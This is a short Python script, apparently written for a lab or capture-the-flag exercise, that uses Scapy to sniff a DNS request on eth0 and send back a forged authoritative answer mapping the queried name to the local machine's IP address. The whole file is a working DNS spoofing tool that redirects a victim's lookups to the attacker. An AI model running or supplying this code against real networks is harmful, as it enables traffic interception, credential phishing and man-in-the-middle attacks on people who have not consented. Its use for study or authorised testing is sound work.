#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 IP
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']

def handle_dns_request(packet):
    # Need to change mac addresses, Ip Addresses, and ports below.
    # We also need
    eth = Ether(src=packet[Ether].dst,dst=packet[Ether].src)
    ip  = IP(dst=packet[IP].src, src=packet[IP].dst)
    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
    dns = DNS(id=packet[DNS].id,
              aa=1, qr=1,
              rd=packet[DNS].rd,
              qdcount=packet[DNS].qdcount,
              qd=packet[DNS].qd,
              ancount=1,
              an=DNSRR(rrname=packet[DNS].qd.qname,type='A',ttl=10,rdata=ipaddr)
          )
    dns_response = eth / ip / udp / dns
    sendp(dns_response, iface="eth0")
    dns_response.show()

def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] & 0x80 = 0"                           # dns request
    ] )

    # sniff the eth0 int without storing packets in memory and stopping after one dns request
    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)
if __name__ == "__main__":
    main()
